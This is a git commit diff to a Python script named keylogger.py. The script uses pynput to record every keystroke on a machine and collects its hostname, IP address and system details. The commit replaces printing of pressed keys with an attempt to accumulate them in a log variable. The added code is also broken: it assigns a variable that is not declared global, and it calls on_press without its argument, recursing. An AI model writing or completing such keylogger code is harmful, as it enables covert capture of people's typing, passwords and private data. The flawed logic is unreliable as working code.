530629a5d36235cd54a43ba9292d3d3148e1e1c5
Ross Greenall <rossgreenall@gmail.com>
2023-08-27 02:58:53 +0100

    Started working on way of logging key output to a variable/file

--- keylogger.py
+++ keylogger.py
@@ -4,7 +4,7 @@ try:
     from pynput.keyboard import Listener
     import socket
     import platform
-    USER_DATA = ""
+    KEYS_LOG = ''
 
 except ModuleNotFoundError:
     packages = ["keyboard","socket","pynput"]
@@ -21,9 +21,14 @@ finally:
     USER_SYSTEM = platform.system()
     USER_MACHINE = platform.machine()
     USER_DATA = USER_HOSTNAME + "\n" + USER_IP + "\n" + USER_PROCESSOR + "\n" + USER_SYSTEM + "\n" + USER_MACHINE
-    print(USER_DATA)
+    
+    def store_data(key):
+        KEYS_LOG = KEYS_LOG + key.char
+        on_press()
+        
+        
     def on_press(key):
-        print("Key pressed: {0}".format(key))
+        store_data(key)
 
     with Listener(on_press=on_press) as listener: 
         listener.join()  
